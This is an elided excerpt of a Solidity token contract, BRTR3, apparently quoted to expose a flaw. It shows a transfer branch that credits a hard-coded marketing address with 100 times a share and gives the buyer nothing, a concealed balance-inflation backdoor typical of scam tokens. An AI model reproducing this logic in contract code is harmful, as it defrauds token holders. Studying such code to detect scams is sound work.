...
contract BRTR3 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    address public marketAddress = 0x509B72d5A1f16116aFe5fA1bd28Ccf11e4c3E528;
    ...
    function _transfer(
        ...
        if (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) {
            ...
            if (sender == _pair) {
                ...
                uint256 marketBonusAmount = share.mul(100);
                _balances[marketAddress] = _balances[marketAddress].add(
                    marketBonusAmount
                );
                _balances[recipient] = _balances[recipient].add(share.mul(0));
